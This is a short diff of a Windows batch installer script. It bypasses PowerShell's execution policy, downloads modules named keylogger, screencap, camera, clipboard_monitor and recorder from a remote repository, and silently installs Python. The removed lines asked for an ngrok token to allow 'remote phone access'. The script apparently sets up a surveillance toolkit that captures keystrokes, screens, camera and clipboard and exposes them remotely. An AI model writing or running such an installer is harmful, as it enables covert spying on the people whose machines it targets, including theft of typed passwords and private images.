@@ -14,18 +14,6 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
   "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""
 
-:: Ask for ngrok token once, save for future runs
-if not exist "%TOKENFILE%" (
-    echo.
-    echo For remote phone access, enter your ngrok token.
-    echo Get one free at ngrok.com - sign up then copy your authtoken.
-    echo Press Enter to skip ^(local network only^).
-    echo.
-    set /p NGROK_TOKEN=Ngrok token:
-    if not "!NGROK_TOKEN!"=="" (
-        echo !NGROK_TOKEN!> "%TOKENFILE%"
-    )
-)
 
 :: Install Python silently if not present
 python --version >nul 2>&1
